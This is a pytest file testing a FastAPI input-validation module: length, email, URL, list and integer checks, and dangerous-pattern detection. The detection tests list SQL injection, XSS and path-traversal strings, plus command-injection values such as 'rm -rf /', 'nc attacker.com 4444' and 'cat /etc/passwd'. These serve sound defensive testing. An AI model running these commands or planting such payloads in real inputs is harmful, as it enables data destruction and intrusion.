"""
Tests for Input Validation Utilities
"""
import pytest
from fastapi import HTTPException

from src.utils.validation import (
    ValidationLimits,
    validate_length,
    validate_no_dangerous_patterns,
    sanitize_text,
    validate_email_address,
    validate_url,
    validate_list_length,
    validate_integer_range,
)


class TestValidateLength:
    """Test string length validation"""
    
    def test_valid_length(self):
        """Test valid string length"""
        result = validate_length("hello", "test", max_length=10)
        assert result == "hello"
    
    def test_too_long(self):
        """Test string too long"""
        with pytest.raises(HTTPException) as exc:
            validate_length("a" * 101, "test", max_length=100)
        assert exc.value.status_code == 413
        assert "exceeds maximum length" in exc.value.detail
    
    def test_too_short(self):
        """Test string too short"""
        with pytest.raises(HTTPException) as exc:
            validate_length("hi", "test", max_length=100, min_length=5)
        assert exc.value.status_code == 422
        assert "must be at least" in exc.value.detail
    
    def test_empty_not_allowed(self):
        """Test empty string not allowed"""
        with pytest.raises(HTTPException) as exc:
            validate_length("", "test", max_length=100, allow_empty=False)
        assert exc.value.status_code == 422
        assert "cannot be empty" in exc.value.detail
    
    def test_empty_allowed(self):
        """Test empty string allowed"""
        result = validate_length("", "test", max_length=100, allow_empty=True)
        assert result == ""
    
    def test_none_not_allowed(self):
        """Test None not allowed"""
        with pytest.raises(HTTPException) as exc:
            validate_length(None, "test", max_length=100, allow_empty=False)
        assert exc.value.status_code == 422
        assert "is required" in exc.value.detail


class TestDangerousPatterns:
    """Test dangerous pattern detection"""
    
    def test_sql_injection_detected(self):
        """Test SQL injection pattern detection"""
        dangerous_inputs = [
            "' OR '1'='1",
            "admin' --",
            "1; DROP TABLE users",
            "' UNION SELECT * FROM passwords",
        ]
        
        for inp in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                validate_no_dangerous_patterns(inp, "test", check_sql=True)
            assert exc.value.status_code == 400
            assert "Invalid input detected" in exc.value.detail
    
    def test_command_injection_detected(self):
        """Test command injection detection"""
        dangerous_inputs = [
            "; rm -rf /",
            "| nc attacker.com 4444",
            "&& whoami",
            "`cat /etc/passwd`",
            "$(curl evil.com)",
        ]
        
        for inp in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                validate_no_dangerous_patterns(inp, "test", check_command=True)
            assert exc.value.status_code == 400
    
    def test_script_injection_detected(self):
        """Test script injection (XSS) detection"""
        dangerous_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img onerror='alert(1)'>",
            "<iframe src='evil.com'>",
        ]
        
        for inp in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                validate_no_dangerous_patterns(inp, "test", check_script=True)
            assert exc.value.status_code == 400
    
    def test_path_traversal_detected(self):
        """Test path traversal detection"""
        dangerous_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/shadow",
            "C:\\Windows\\System32",
        ]
        
        for inp in dangerous_inputs:
            with pytest.raises(HTTPException) as exc:
                validate_no_dangerous_patterns(inp, "test", check_path=True)
            assert exc.value.status_code == 400
    
    def test_safe_input_passes(self):
        """Test that safe input passes all checks"""
        safe_inputs = [
            "Hello, world!",
            "user@example.com",
            "https://example.com",
            "This is a normal query",
        ]
        
        for inp in safe_inputs:
            result = validate_no_dangerous_patterns(inp, "test")
            assert result == inp


class TestSanitizeText:
    """Test text sanitization"""
    
    def test_trim_whitespace(self):
        """Test whitespace trimming"""
        assert sanitize_text("  hello  ") == "hello"
        assert sanitize_text("\n\nhello\n\n") == "hello"
    
    def test_normalize_whitespace(self):
        """Test whitespace normalization"""
        assert sanitize_text("hello    world") == "hello world"
        assert sanitize_text("hello\n\nworld") == "hello world"
    
    def test_preserve_newlines(self):
        """Test preserving newlines"""
        text = "line1\n\nline2\n\nline3"
        result = sanitize_text(text, preserve_newlines=True)
        assert "\n" in result
        assert "line1" in result
        assert "line2" in result
    
    def test_remove_excessive_newlines(self):
        """Test removing excessive newlines"""
        text = "line1\n\n\n\nline2"
        result = sanitize_text(text, preserve_newlines=True)
        assert result == "line1\n\nline2"
    
    def test_empty_string(self):
        """Test empty string"""
        assert sanitize_text("") == ""
        assert sanitize_text(None) == ""


class TestValidateEmail:
    """Test email validation"""
    
    def test_valid_email(self):
        """Test valid email addresses"""
        valid_emails = [
            "user@example.com",
            "test.user@domain.co.uk",
            "user+tag@example.com",
            "123@example.com",
        ]
        
        for email in valid_emails:
            result = validate_email_address(email)
            assert result == email.lower()
    
    def test_invalid_email(self):
        """Test invalid email addresses"""
        invalid_emails = [
            "not-an-email",
            "@example.com",
            "user@",
            "user @example.com",
            "user@.com",
        ]
        
        for email in invalid_emails:
            with pytest.raises(HTTPException) as exc:
                validate_email_address(email)
            assert exc.value.status_code == 422
            assert "Invalid email" in exc.value.detail
    
    def test_email_too_long(self):
        """Test email address too long"""
        email = "a" * 310 + "@example.com"
        with pytest.raises(HTTPException) as exc:
            validate_email_address(email)
        assert exc.value.status_code == 422
        assert "too long" in exc.value.detail
    
    def test_email_case_normalization(self):
        """Test email case normalization"""
        result = validate_email_address("USER@EXAMPLE.COM")
        assert result == "user@example.com"


class TestValidateURL:
    """Test URL validation"""
    
    def test_valid_url(self):
        """Test valid URLs"""
        valid_urls = [
            "http://example.com",
            "https://example.com/path",
            "https://sub.example.com:8080/path?query=1",
        ]
        
        for url in valid_urls:
            result = validate_url(url)
            assert result == url
    
    def test_invalid_url(self):
        """Test invalid URLs"""
        invalid_urls = [
            "not a url",
            "ftp://example.com",  # No http/https
            "//example.com",  # No protocol
        ]
        
        for url in invalid_urls:
            with pytest.raises(HTTPException) as exc:
                validate_url(url, allow_relative=False)
            assert exc.value.status_code == 422
    
    def test_dangerous_protocols(self):
        """Test dangerous protocols blocked"""
        dangerous_urls = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)",
            "file:///etc/passwd",
        ]
        
        for url in dangerous_urls:
            with pytest.raises(HTTPException) as exc:
                validate_url(url, allow_relative=True)
            assert exc.value.status_code == 400
            assert "Dangerous URL protocol" in exc.value.detail
    
    def test_url_too_long(self):
        """Test URL too long"""
        url = "http://" + "a" * 3000 + ".com"
        with pytest.raises(HTTPException) as exc:
            validate_url(url)
        assert exc.value.status_code == 422
        assert "too long" in exc.value.detail


class TestValidateList:
    """Test list validation"""
    
    def test_valid_list(self):
        """Test valid list"""
        items = [1, 2, 3]
        result = validate_list_length(items, "test", max_length=10)
        assert result == items
    
    def test_list_too_long(self):
        """Test list too long"""
        items = list(range(101))
        with pytest.raises(HTTPException) as exc:
            validate_list_length(items, "test", max_length=100)
        assert exc.value.status_code == 413
        assert "exceeds maximum length" in exc.value.detail
    
    def test_list_too_short(self):
        """Test list too short"""
        items = [1]
        with pytest.raises(HTTPException) as exc:
            validate_list_length(items, "test", max_length=100, min_length=5)
        assert exc.value.status_code == 422
        assert "must have at least" in exc.value.detail
    
    def test_empty_list_allowed(self):
        """Test empty list allowed"""
        result = validate_list_length([], "test", max_length=10, allow_empty=True)
        assert result == []
    
    def test_empty_list_not_allowed(self):
        """Test empty list not allowed"""
        with pytest.raises(HTTPException) as exc:
            validate_list_length([], "test", max_length=10, allow_empty=False)
        assert exc.value.status_code == 422
        assert "cannot be empty" in exc.value.detail


class TestValidateInteger:
    """Test integer range validation"""
    
    def test_valid_integer(self):
        """Test valid integer"""
        result = validate_integer_range(5, "test", min_value=0, max_value=10)
        assert result == 5
    
    def test_integer_too_small(self):
        """Test integer too small"""
        with pytest.raises(HTTPException) as exc:
            validate_integer_range(-5, "test", min_value=0)
        assert exc.value.status_code == 422
        assert "must be at least" in exc.value.detail
    
    def test_integer_too_large(self):
        """Test integer too large"""
        with pytest.raises(HTTPException) as exc:
            validate_integer_range(15, "test", max_value=10)
        assert exc.value.status_code == 422
        assert "must be at most" in exc.value.detail
    
    def test_no_limits(self):
        """Test integer with no limits"""
        result = validate_integer_range(999999, "test")
        assert result == 999999


class TestValidationLimits:
    """Test validation limit constants"""
    
    def test_limits_are_reasonable(self):
        """Test that limits are reasonable"""
        assert ValidationLimits.QUERY_MAX_LENGTH == 10000
        assert ValidationLimits.EMAIL_BODY_MAX_LENGTH == 1_000_000
        assert ValidationLimits.MAX_RECIPIENTS == 100
        assert ValidationLimits.MAX_PAGE_SIZE == 100


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
